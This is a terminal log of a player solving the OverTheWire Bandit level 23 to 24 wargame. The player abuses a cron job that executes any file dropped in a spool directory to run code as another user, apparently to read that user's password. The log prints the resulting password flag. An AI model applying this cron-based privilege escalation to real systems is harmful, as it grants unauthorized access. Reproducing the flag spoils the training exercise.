```bash 
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 ./$i
        rm -f ./$i
    fi
done


bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24
bandit23@bandit:/var/spool/bandit24$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24$ ls -la
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24$ touch file
bandit23@bandit:/var/spool/bandit24$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24$ ls file
file
bandit23@bandit:/var/spool/bandit24$ nano file
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/var/spool/bandit24$ chmod +x file
bandit23@bandit:/var/spool/bandit24$ ls file2
ls: cannot access 'file2': No such file or directory
bandit23@bandit:/var/spool/bandit24$ ls file2
ls: cannot access 'file2': No such file or directory
bandit23@bandit:/var/spool/bandit24$ ls file
file
bandit23@bandit:/var/spool/bandit24$ ls -la file
-rwxr-xr-x 1 bandit23 bandit23 38 Feb 26 01:03 file
bandit23@bandit:/var/spool/bandit24$ ls -la file
-rwxr-xr-x 1 bandit23 bandit23 38 Feb 26 01:03 file
bandit23@bandit:/var/spool/bandit24$ ls -la file
-rwxr-xr-x 1 bandit23 bandit23 38 Feb 26 01:03 file
bandit23@bandit:/var/spool/bandit24$ ls -la file
-rwxr-xr-x 1 bandit23 bandit23 38 Feb 26 01:03 file
bandit23@bandit:/var/spool/bandit24$ ls -la file
ls: cannot access 'file': No such file or directory
bandit23@bandit:/var/spool/bandit24$ ls -la file2
-rw-r--r-- 1 bandit24 bandit24 33 Feb 26 01:04 file2
bandit23@bandit:/var/spool/bandit24$ cat fk.e
cat: fk.e: No such file or directory
bandit23@bandit:/var/spool/bandit24$
bandit23@bandit:/var/spool/bandit24$ cat file2
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```